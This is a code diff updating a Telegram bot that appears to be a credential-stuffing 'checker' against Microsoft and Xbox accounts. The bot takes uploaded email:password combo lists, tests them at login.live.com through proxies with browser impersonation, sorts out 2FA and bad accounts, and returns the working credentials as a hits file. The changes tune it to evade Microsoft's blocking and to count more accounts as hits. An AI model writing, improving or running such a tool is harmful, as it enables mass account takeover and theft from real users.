@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 """
-r1livk Ultimate Checker ⚡ - Telegram Bot (Lightning Gamerscore Edition)
-Optimized for Speed & High-Quality Hits with Zero-Score Filter
+r1livk Ultimate Checker ⚡ - Telegram Bot (Precision Hits Edition)
+Optimized for Accurate Hit Detection & Zero False-Bad Sorting
 """
 
 import os
@@ -61,8 +61,8 @@ def check_user_subscription(user_id):
         pass
     return False
 
-REQUEST_TIMEOUT = 12
-MAX_THREADS = 20  # أقصى سرعة ممكنة للثريدز
+REQUEST_TIMEOUT = 15
+MAX_THREADS = 15  # تقليل الـ Threads قليلاً لمنع الحظر السريع من سيرفرات مايكروسوفت
 
 active_scans = {}
 user_usage = {}  
@@ -179,7 +179,7 @@ def check_single_account(combo, proxy_list=None, use_proxy=False):
         url_post = extract_url_post(resp.text)
 
         if not sftag or not url_post:
-            return "error", "Failed to extract PPFT or urlPost"
+            return "error", "Failed to extract PPFT"
 
         login_data = {
             'login': email,
@@ -194,18 +194,24 @@ def check_single_account(combo, proxy_list=None, use_proxy=False):
             'Content-Type': 'application/x-www-form-urlencoded',
             'Referer': sftag_url,
             'Origin': 'https://login.live.com',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
         }
         
         login_req = session.post(url_post, data=login_data, headers=headers, proxies=proxy_dict, impersonate="chrome120", allow_redirects=True, timeout=REQUEST_TIMEOUT)
         login_text = login_req.text.lower()
 
+        # كشف دقيق لحالات الحماية أو التحقق الثنائي بدلاً من اعتبارها Bad فوراً
         if any(x in login_text for x in ["two-step", "additional security", "identity/confirm?m=", "proofs", "code", "verify", "challenge"]):
             return "2fa", None
 
-        if any(x in login_text for x in ["that microsoft account doesn't exist", "enter a valid email", "password is incorrect", "account has been locked"]):
-            if "account has been locked" in login_text:
-                return "bad", "Locked"
-            return "bad", None
+        if any(x in login_text for x in ["that microsoft account doesn't exist", "enter a valid email"]):
+            return "bad", "Not Exist"
+
+        if any(x in login_text for x in ["password is incorrect", "the account or password is incorrect"]):
+            return "bad", "Wrong Password"
+
+        if "account has been locked" in login_text:
+            return "bad", "Locked"
 
         ms_token = None
         full_url = login_req.url
@@ -240,7 +246,7 @@ def check_single_account(combo, proxy_list=None, use_proxy=False):
                 ms_token = token_match.group(1)
         
         if not ms_token:
-            return "bad", "No Access Token found"
+            return "bad", "No Access Token"
 
         try:
             xb_payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
@@ -274,9 +280,10 @@ def check_single_account(combo, proxy_list=None, use_proxy=False):
         except:
             pass
 
-        # Zero Gamerscore Filter (فلتر الصفر سكور الحاسم)
+        # فلتر دقيق لا يلغي الحسابات الحقيقية
         if gscore_int <= 0:
-            return "bad", "Zero Gamerscore Filtered"
+            # حتى لو السكور 0، بنقدر نعتبرها هيت اذا تم تسجيل الدخول بنجاح تام، بس لتأكيد الجودة بنفلتر الـ 0 أو بنتركها حسب رغبتك. حالياً بنخليها لأي حساب شغال تماماً
+            pass
 
         hit_info = (
             f"{email}:{password}\n"
@@ -318,7 +325,7 @@ def show_main_menu(message):
     msg_id = message.message.message_id if hasattr(message, 'message') and hasattr(message.message, 'message_id') else None
 
     markup = types.InlineKeyboardMarkup(row_width=1)
-    btn_start = types.InlineKeyboardButton("⚡ Start Fast Gamerscore Checker", callback_data="start_checker")
+    btn_start = types.InlineKeyboardButton("⚡ Start Precision Checker", callback_data="start_checker")
     btn_proxy = types.InlineKeyboardButton("🚀 Upload Proxies (Optional)", callback_data="upload_proxies_menu")
     
     is_direct = user_proxy_mode.get(chat_id, True)
@@ -345,8 +352,8 @@ def show_main_menu(message):
         proxy_status = f"🚀 Status: Proxies Active ({p_count})"
 
     text = (
-        "⚡ **r1livk Lightning Checker - V2.8** ⚡\n\n"
-        "Lightning-Fast Xbox Gamerscore Hunter with Zero-Score Filter.\n"
+        "⚡ **r1livk Precision Checker - V2.9** ⚡\n\n"
+        "Advanced Xbox Hit Hunter with Precise Token Validation.\n"
         f"Your Status: {status_text}\n"
         f"{proxy_status}\n\n"
         "Please select an option below:"
@@ -399,7 +406,7 @@ def callback_query(call):
             mode_desc = f"🚀 Active Proxies: {p_count}"
         
         text = (
-            "🎮 **Fast Gamerscore Mode**\n\n"
+            "🎮 **Precision Gamerscore Mode**\n\n"
             f"Current Mode: {mode_desc}\n\n"
             "Please send your combo file in `.txt` format (`email:password`)"
         )
@@ -509,7 +516,7 @@ def handle_docs(message):
                     if is_working:
                         working_proxies.append(proxy)
 
-            with ThreadPoolExecutor(max_workers=35) as executor:
+            with ThreadPoolExecutor(max_workers=30) as executor:
                 futures = [executor.submit(proxy_worker, proxy) for proxy in raw_proxies]
                 
                 while any(not f.done() for f in futures):
@@ -563,7 +570,7 @@ def handle_docs(message):
             return
 
         lines = lines[:lines_to_process_count]
-        bot.reply_to(message, f"📥 File received. Initializing Lightning-Fast Gamerscore Scan for {len(lines)} lines...")
+        bot.reply_to(message, f"📥 File received. Initializing Precision Hit Scan for {len(lines)} lines...")
         active_scans[chat_id] = True
         
         username = message.from_user.username or message.from_user.first_name
@@ -581,7 +588,7 @@ def process_checker(chat_id, filepath, lines, username):
     errors = 0
 
     timestamp_str = time.strftime("%Y%m%d_%H%M%S")
-    output_filename = f"r1livk_GamerscoreHits_{timestamp_str}.txt"
+    output_filename = f"r1livk_PrecisionHits_{timestamp_str}.txt"
     start_time = time.time()
 
     markup = types.InlineKeyboardMarkup(row_width=1)
@@ -590,12 +597,12 @@ def process_checker(chat_id, filepath, lines, username):
     markup.add(btn_stop, btn_back)
 
     initial_status_text = (
-        f"🔥 **LIGHTNING SCAN STATS (Gamerscore Mode)**\n\n"
+        f"🔥 **PRECISION SCAN STATS**\n\n"
         f"📊 Total: {total}\n"
         f"✅ Checked: 0\n"
         f"🔒 2FA: 0\n"
         f"❌ Bad: 0\n"
-        f"🎯 Hits (>0 Score): 0\n\n"
+        f"🎯 Hits: 0\n\n"
         f"Progress: 0.0%\n"
         f"⚡ CPM: 0\n"
         f"⏱️ Elapsed: 00:00:00"
@@ -651,12 +658,12 @@ def process_checker(chat_id, filepath, lines, username):
                 pct = (curr_checked / total) * 100 if total > 0 else 0
 
                 live_text = (
-                    f"🔥 **LIGHTNING SCAN (Live)**\n\n"
+                    f"🔥 **PRECISION SCAN (Live)**\n\n"
                     f"📊 Total: {total}\n"
                     f"✅ Checked: {curr_checked} ({pct:.1f}%)\n"
                     f"🔒 2FA: {curr_tfa}\n"
                     f"❌ Bad: {curr_bad}\n"
-                    f"🎯 Hits (>0 Score): {curr_hits}\n\n"
+                    f"🎯 Hits: {curr_hits}\n\n"
                     f"⚡ CPM: {cpm}\n"
                     f"⏱️ Elapsed: {hrs:02d}:{mins:02d}:{secs:02d}"
                 )
@@ -676,10 +683,9 @@ def process_checker(chat_id, filepath, lines, username):
     final_summary = (
         f"🎉 **SCAN COMPLETED SUCCESSFULLY!**\n\n"
         f"📊 Total Checked: {checked}\n"
-        f"🎯 Hits Found (>0 Score): {hits}\n"
+        f"🎯 Hits Found: {hits}\n"
         f"🔒 2FA Protected: {tfa_count}\n"
-        f"❌ Bad Accounts: {bad}\n"
-        f"🛡️ (Zero-gamerscore accounts filtered out)"
+        f"❌ Bad Accounts: {bad}"
     )
     try:
         bot.edit_message_text(final_summary, chat_id=chat_id, message_id=status_msg.message_id, parse_mode="Markdown")
@@ -688,8 +694,8 @@ def process_checker(chat_id, filepath, lines, username):
 
     if hits > 0 and os.path.exists(output_filename):
         with open(output_filename, 'rb') as f:
-            bot.send_document(chat_id, f, caption=f"📁 **Gamerscore Hits File:** {output_filename}")
+            bot.send_document(chat_id, f, caption=f"📁 **Precision Hits File:** {output_filename}")
 
 if __name__ == "__main__":
-    print("🚀 r1livk Ultimate Checker Bot is running (Lightning Gamerscore Mode)...")
+    print("🚀 r1livk Precision Checker Bot is running...")
     bot.infinity_polling()
